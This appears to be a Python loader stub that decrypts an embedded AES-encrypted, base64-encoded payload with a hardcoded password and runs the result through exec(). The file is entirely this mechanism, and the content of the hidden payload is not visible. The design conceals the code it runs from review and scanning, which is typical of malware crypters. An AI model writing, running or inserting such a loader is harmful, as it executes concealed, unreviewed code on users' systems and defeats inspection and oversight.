import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64
import tempfile
import subprocess

# Constant key (same as encoder)
PASSWORD = "we3p2v5t85"
KEY = hashlib.md5(PASSWORD.encode()).digest()  # 16-byte AES-128 key

# Base64-encoded encrypted data (replace with your actual Base64 string)
ENCRYPTED_BASE64 = """t628DOUK7AXE9nORTaWHeMueLUV6iEnDgVGLFPOLY+ngiED0UwfWTvhpgo23t5X6Q2LDVLwJ4z2EVLGyTYJPtyM4WlKXWd6RQZILCB3FvB/fLTyZPmMnwBRa85IhHk6F/zkeY8HSfVSEFDM3MWlzX1o3hOE0XgIJ+JVv4P95hOSLCk7mg3PkyUM0ia7NuVOJpMyF2XxY0HAUCZ8/VlNgHIdHWsIR2+NUUZRt2n3Hla1OOCNHPpbF00FJ097jc0ILoCj46C+u4ePEIWLI53Akp1ry7AlDW6g9T8OjGXCznwQ0g39NUPxd2ltZYcqGdBlIholb4oHHgo/dBEgEM91lIxjtoWEYCw5EnZYqU5SCc8H1wVwZbmlSyOET4x6oPctsEg5YjUFiDHHOn/+z6/0595mx+TDCwZL+GftfMR9kGSrqoyWSW0jMOJCHuKvAUGZrv8q89h+Yk+RU7m+0kcrOXT8/CYTrAHZfBjbwkkE7m5P2oz9od+1XqSKTs9VoZCujdsAi3Wo/35l4EqWndGxfGu+ES0YY5QS1tDvES2Hw7dH9DM+PIDhE48Sh9GUva2H5RKgJwy1BTRUcL4X09QxksLsrz7S4kzZhUnFdg0PP1z23Z7QmiBoSm98tHDncMKbotqaBl7eLQul5mtK5CAdRFlXe8gmQOLgCyAkfm4S1SrbtO6VaZVuqjKEydUO/FA3AoNHsplsqV6S4drT4KFCXwfh/hCfh730dw+4A7qXJu8QeDZcn6njQUBWXU6RkRehqI7aWMdRMLfIVN1j8QPYItKtTPBK8FA1OVYZLkIAfRbRpAra65TfQyEQDdB2gaRW0ydERBm6oLWJPb9l5ZVjlJWntuitpgJhMP/6rPnOX8bN6/NMj90ePqjCoij/lujIPx+IdBBNR60RyuP8zFGzqZclRCeTeYyn87uopUW7P++1V1zpx7YqvsfQlGarQyMYgaLqFZqUa5uB/+o6/pSVDiCWHbTQYSpbqAKa+f/XTN6s="""

def decrypt_and_execute():
    try:
        # Decode Base64 to get IV + ciphertext
        data = base64.b64decode(ENCRYPTED_BASE64.strip())
        
        # Extract IV (first 16 bytes) and ciphertext (rest)
        iv = data[:16]
        ciphertext = data[16:]
        
        # Decrypt
        cipher = AES.new(KEY, AES.MODE_CBC, iv)
        decrypted_code = unpad(cipher.decrypt(ciphertext), AES.block_size).decode('utf-8')
        
        print("[+] Decrypted code successfully. Executing...")
        
        # Option 1: Direct execution (dangerous if code is untrusted)
        exec(decrypted_code)
        
        
        return True
    
    except Exception as e:
        print(f"[!] Failed: {e}")
        return False

if __name__ == "__main__":
    decrypt_and_execute()  # No file input needed